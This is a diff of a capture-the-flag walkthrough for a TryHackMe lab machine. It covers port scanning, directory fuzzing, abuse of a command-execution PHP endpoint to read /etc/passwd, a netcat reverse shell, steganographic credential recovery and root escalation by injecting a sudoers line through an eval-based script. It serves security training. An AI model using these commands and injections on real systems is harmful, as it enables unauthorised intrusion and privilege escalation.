@@ -1,3 +1,5 @@
+Hi, here is how to successfully complete the machine https://tryhackme.com/r/room/yueiua
+
 as always we will first of all start by doing an NMAP scan of the machine.
 
 I like to do a quick scan first, see what I find and then do a deep scan on the open ports. (and always saving the result in a file)
@@ -23,7 +25,7 @@ PORT   STATE SERVICE REASON
 </code></pre>
 
 
-
+we can see that we have ports 22 and 80 available, as we already know port 22 corresponds to ssh and port 80 to http
 <pre><code>~> sudo nmap -p80,22 -sCV -Pn 10.10.149.122 | tee nmap2.txt 
 
 Starting Nmap 7.95 ( https://nmap.org ) at 2024-09-08 20:06 -03
@@ -45,71 +47,68 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
 </code></pre>
 
+if we inspect the code of the page we can see this
 
 ![2024-09-08_20-21](https://github.com/user-attachments/assets/11dd79cf-221d-4743-9159-2e8702ce0a9c)
 
+Since /assets/ appears to be a directory that stores static resources (such as images, CSS, JS, etc.), you can try fuzzing that directory to discover unintentional files or configuration bugs
+
+my preferred fuzzing tool is usually gobuster, but I also like to implement ffuf
+
+let's perform fuzzing on the directory 10.10.171.52/assets/ using the following command, I will use the dictionary SecLists/Discovery/Web-Content/raft-medium-words.txt
+
+The file raft-medium-words.txt is located in the SecLists/Discovery/Web-Content/ directory and is part of a set of lists called RAFT (Realistic Attack in a Financial Technology). This set was designed to be used for web content discovery testing.
+
+gobuster returned several things but the most interesting is the index.php file
 <pre><code>
-/* General Styles */
-body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-image: url(images/yuei.jpg);
-    background-size: cover;
-    background-position: center center;
-    background-attachment: fixed;
-}
-
-</code></pre>
-
-<pre><code>
-~> sudo gobuster dir -u http://10.10.242.225/ -w /home/maxi/Escritorio/SecLists/Discove
-ry/Web-Content/raft-medium-words.txt -u http://10.10.149.122/assets/ | tee /home/maxi/CTF/THM/U.A\ High\ School/fuzz/gobuster-assets-enum.txt 
-
+~> sudo gobuster dir -u http://10.10.171.52/assets -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php,html,txt,js,json,cfg,xml
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.149.122/assets/
+[+] Url:                     http://10.10.171.52/assets
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/raft-medium-words.txt
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.6
+[+] Extensions:              html,txt,js,json,cfg,xml,php
 [+] Timeout:                 10s
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/.html                (Status: 403) [Size: 278]
-/images               (Status: 301) [Size: 322] [--> http://10.10.149.122/assets/images/]
-/.php                 (Status: 403) [Size: 278]
-/.htm                 (Status: 403) [Size: 278]
-/.                    (Status: 200) [Size: 0]
-/.htaccess            (Status: 403) [Size: 278]
-/.phtml               (Status: 403) [Size: 278]
-/.htc                 (Status: 403) [Size: 278]
-/.html_var_DE         (Status: 403) [Size: 278]
-/.htpasswd            (Status: 403) [Size: 278]
-/.html.               (Status: 403) [Size: 278]
-/.html.html           (Status: 403) [Size: 278]
-/.htpasswds           (Status: 403) [Size: 278]
-/.htm.                (Status: 403) [Size: 278]
-/.htmll               (Status: 403) [Size: 278]
-/.phps                (Status: 403) [Size: 278]
-/.html.old            (Status: 403) [Size: 278]
-Progress: 12387 / 63088 (19.63%)^C⏎                  
+/images               (Status: 301) [Size: 320] [--> http://10.10.171.52/assets/images/]
+/.php                 (Status: 403) [Size: 277]
+/.html                (Status: 403) [Size: 277]
+/.html.php            (Status: 403) [Size: 277]
+/.html.html           (Status: 403) [Size: 277]
+/.html.txt            (Status: 403) [Size: 277]
+/.html.js             (Status: 403) [Size: 277]
+/.html.json           (Status: 403) [Size: 277]
+/.html.cfg            (Status: 403) [Size: 277]
+/.html.xml            (Status: 403) [Size: 277]
+/index.php            (Status: 200) [Size: 0]               
 </code></pre>
 
-http://10.10.149.122/assets/index.php?cmd=ls
-aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==
+and just like that we have an RCE
 
+RCE (Remote Code Execution) is a security vulnerability that allows an attacker to execute arbitrary commands or malicious code on a remote system. This type of vulnerability is extremely serious because it can give the attacker full control over the compromised system, and that is exactly what we are going to do
+
+
+http://10.10.149.122/assets/index.php?cmd=ls
+
+<pre><code>aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==</code></pre>
 
 <pre><code>~> echo "aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==" | base64 -d
 images
 index.php
 styles.css</code></pre>
 
-http://10.10.149.122/assets/index.php?cmd=cat%20/etc/passwd
+
+
+with index.php?cmd=cat%20/etc/passwd we can get the user
+
+<pre><code>
 cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpmd3VwZC1yZWZyZXNoOng6MTExOjExNjpmd3VwZC1yZWZyZXNoIHVzZXIsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTEzOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmRla3U6eDoxMDAwOjEwMDA6ZGVrdTovaG9tZS9kZWt1Oi9iaW4vYmFzaAoKbHhkOng6OTk4OjEwMDo6L3Zhci9zbmFwL2x4ZC9jb21tb24vbHhkOi9iaW4vZmFsc2UK
 <pre><code>echo "...." | base64 -d
 root:x:0:0:root:/root:/bin/bash
@@ -146,11 +145,16 @@ usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
 sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 deku:x:1000:1000:deku:/home/deku:/bin/bash
+</code></pre>
 
 lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 </code></pre>
 
+to be able to work much more comfortably with this RCE we are going to make a reverse shell
+
 ![2024-09-08_20-50](https://github.com/user-attachments/assets/764b03b1-78dc-4827-a72b-f4bfc6599216)
+
+To get a more functional shell and avoid problems with the terminal
 
 <pre><code>~> nc -nlvp 3333
 whoami
@@ -168,10 +172,9 @@ www-data@myheroacademia:/var/www/html/assets$ export TERM=xterm
 
 www-data@myheroacademia:/var/www/html/assets$ export SHELL=/bin/bash
 export SHELL=/bin/bash
-
 </code></pre>
 
-
+I found some relevant images, I'm going to download them to my machine.
 <pre><code>ww-data@myheroacademia:/var/www/html/assets$ cd images
 cd images
 www-data@myheroacademia:/var/www/html/assets/images$ ls
@@ -200,9 +203,6 @@ oneforall.jpg: data</code></pre>
 <pre><code>www-data@myheroacademia:/var/www$ ls
 ls
 Hidden_Content	html
-www-data@myheroacademia:/var/www$ cat Hidden_Content
-cat Hidden_Content
-cat: Hidden_Content: Is a directory
 www-data@myheroacademia:/var/www$ cd Hidden_Content
 cd Hidden_Content
 www-data@myheroacademia:/var/www/Hidden_Content$ ls
@@ -216,7 +216,15 @@ QWxsbWlnaHRGb3JFdmVyISEhCg==</code></pre>
 <pre><code> ~> echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d
 AllmightForEver!!!</code></pre>
 
-<pre><code>> steghide extract -sf oneforall.jpg 
+I try to extract information from the images but I can't because the image is corrupted.
+
+When using xxd to display the contents of the file oneforall.jpg, we see this
+
+The file header shows that the file starts with 8950 4e47, which is the magic number for PNG files, not JPG. This indicates that the file is actually a PNG image.
+
+so let's manually fix the problem by changing the magic number to FF D8 FF E0 00 10 4A 46 49 46 00 00 01
+
+<pre><code>~> steghide extract -sf oneforall.jpg 
 Anotar salvoconducto: 
 steghide: el formato del archivo "oneforall.jpg" no es reconocido.
 maxi@maxi-notebook ~/C/T/U/content [1]> xxd oneforall.jpg | head
@@ -231,7 +239,12 @@ maxi@maxi-notebook ~/C/T/U/content [1]> xxd oneforall.jpg | head
 00000080: 2828 2828 2828 2828 2828 2828 2828 2828  ((((((((((((((((
 00000090: 2828 2828 2828 2828 2828 2828 2828 ffc0  ((((((((((((((..</code></pre>
 
-<pre><code>steghide extract -sf oneforall.jpg
+<pre><code>~> hexedit oneforall.jpg</code></pre>
+
+![2024-09-08_21-21](https://github.com/user-attachments/assets/136725cc-4245-4f5a-b259-7585fc0ed774)
+
+now that we have fixed the file we can extract the information correctly
+<pre><code>~> steghide extract -sf oneforall.jpg
 Anotar salvoconducto: 
 anot� los datos extra�dos e/"creds.txt".
 maxi@maxi-notebook ~/C/T/U/content> ls
@@ -240,9 +253,10 @@ creds.txt  oneforall.jpg  yuei.jpg
   > cat creds.txt 
 Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:
 
-deku:One?For?All_!!one1/A
+deku:????
 </code></pre>
 
+now with that credential in my possession I am going to try to login via ssh
 <pre><code>> ssh deku@10.10.149.122
 The authenticity of host '10.10.149.122 (10.10.149.122)' can't be established.
 ED25519 key fingerprint is SHA256:OgRmqdwC/bY0nCsZ5+MHrpGGo75F1+78/LGZjSVg2VY.
@@ -284,51 +298,81 @@ To check for new updates run: sudo apt update
 
 Last login: Thu Feb 22 21:27:54 2024 from 10.0.0.3</code></pre>
 
-<pre><code></code></pre>
+and we found our first fland
+<pre><code>deku@myheroacademia:~$ ls
+user.txt
 
-<pre><code></code></pre>
+deku@myheroacademia:~$ cat user.txt
+THM{????????????}
+deku@myheroacademia:~$ </code></pre>
 
-<pre><code></code></pre>
 
-<pre><code></code></pre>
 
-<pre><code></code></pre>
+I have credentials so I'm trying to see if I can get root access.
+<pre><code>deku@myheroacademia:/opt/NewComponent$ sudo -l
+[sudo] password for deku: 
+Matching Defaults entries for deku on myheroacademia:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-<pre><code></code></pre>
+User deku may run the following commands on myheroacademia:
+    (ALL) /opt/NewComponent/feedback.sh</code></pre>
 
-<pre><code></code></pre>
+and this is the feedback.sh script
 
-<pre><code></code></pre>
+This script is intended to collect user feedback and store it in a file, but the use of eval to handle user input is a significant vulnerability.
 
-<pre><code></code></pre>
 
-<pre><code></code></pre>
 
-<pre><code></code></pre>
+<pre><code>deku@myheroacademia:~$ cat /opt/NewComponent/feedback.sh
+#!/bin/bash
 
-<pre><code></code></pre>
+echo "Hello, Welcome to the Report Form       "
+echo "This is a way to report various problems"
+echo "    Developed by                        "
+echo "        The Technical Department of U.A."
 
-<pre><code></code></pre>
+echo "Enter your feedback:"
+read feedback
 
-<pre><code></code></pre>
 
-<pre><code></code></pre>
+if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
+    echo "It is This:"
+    eval "echo $feedback"
 
-<pre><code></code></pre>
+    echo "$feedback" >> /var/log/feedback.txt
+    echo "Feedback successfully saved."
+else
+    echo "Invalid input. Please provide a valid input." 
+fi</code></pre>
 
-<pre><code></code></pre>
+This line allows the user deku to execute any command without a password (ALL=NOPASSWD: ALL). Using >> /etc/sudoers redirects the entry to the /etc/sudoers file, which modifies the sudoers configuration to allow deku to execute any command as root without a password.
+<pre><code>deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh
+Hello, Welcome to the Report Form       
+This is a way to report various problems
+    Developed by                        
+        The Technical Department of U.A.
+Enter your feedback:
+deku ALL=NOPASSWD: ALL >> /etc/sudoers
+It is This:
+Feedback successfully saved.</code></pre>
 
-<pre><code></code></pre>
+<pre><code>deku@myheroacademia:/opt/NewComponent$ sudo /bin/bash</code></pre>
 
-<pre><code></code></pre>
+<pre><code>root@myheroacademia:/# cd root
+root@myheroacademia:~# ls
+root.txt  snap
+root@myheroacademia:~# cat root.txt
+root@myheroacademia:/opt/NewComponent# cat /root/root.txt
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                  _    _ 
+             _   _        ___    | |  | |
+            | \ | | ___  /   |   | |__| | ___ _ __  ___
+            |  \| |/ _ \/_/| |   |  __  |/ _ \ '__|/ _ \
+            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |
+            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ 
 
-<pre><code></code></pre>
-
-<pre><code></code></pre>
-
-<pre><code></code></pre>
-
-<pre><code></code></pre>
-
-<pre><code></code></pre>
-
+THM{????????????????}</code></pre>
